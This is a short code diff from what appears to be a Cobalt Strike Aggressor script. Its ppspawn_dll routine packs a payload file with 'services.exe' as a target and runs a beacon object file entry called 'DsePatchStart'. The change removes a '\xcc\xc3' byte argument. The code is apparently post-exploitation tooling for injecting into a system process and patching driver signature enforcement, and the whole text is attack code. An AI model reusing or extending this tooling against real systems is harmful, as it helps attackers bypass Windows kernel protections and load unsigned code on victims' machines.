@@ -27,7 +27,7 @@ sub ppspawn_dll {
 	$payb = readb( $payf, -1 );
 	closef( $payf );
 
-	$args = bof_pack( $1, "ZZZbib", $dlln, $lnkn, "services.exe", $payb, $3, "\xcc\xc3" );
+	$args = bof_pack( $1, "ZZZbib", $dlln, $lnkn, "services.exe", $payb, $3 );
 	beacon_inline_execute( $1, $bofb, "DsePatchStart", $args );
 }
 
